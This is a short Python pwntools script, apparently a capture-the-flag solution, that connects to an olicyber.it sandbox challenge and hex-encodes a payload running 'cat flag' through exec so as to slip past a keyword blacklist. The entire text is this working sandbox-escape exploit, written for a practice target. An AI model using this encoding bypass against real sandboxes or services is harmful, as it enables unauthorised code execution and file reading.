from pwn import *

r = remote("sandbox_v1.challs.olicyber.it", 35003)

#the script checks for blacklisted words in the string, but by encoding it we can bypass it
payload = b"import subprocess\nsubprocess.run(['cat', 'flag'])".hex()

r.sendline(f"exec(bytes.fromhex('{payload}').decode())")

r.interactive()